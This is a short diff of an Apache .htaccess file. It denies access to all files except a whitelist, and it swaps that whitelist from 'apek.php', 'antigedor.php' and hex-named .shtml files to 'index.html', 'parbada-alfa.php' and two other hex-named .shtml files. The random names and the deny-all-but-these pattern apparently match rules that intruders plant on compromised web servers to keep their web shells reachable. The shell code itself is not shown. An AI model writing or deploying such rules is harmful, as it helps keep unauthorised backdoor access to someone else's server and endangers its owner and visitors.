@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(688d2cc16a2d6.shtML|apek.php|antigedor.php|xman.sHTml)$">
+<FilesMatch "^(index.html|parbada-alfa.php|688331544f40a.sHTmL|688e6423867eb.shtml)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
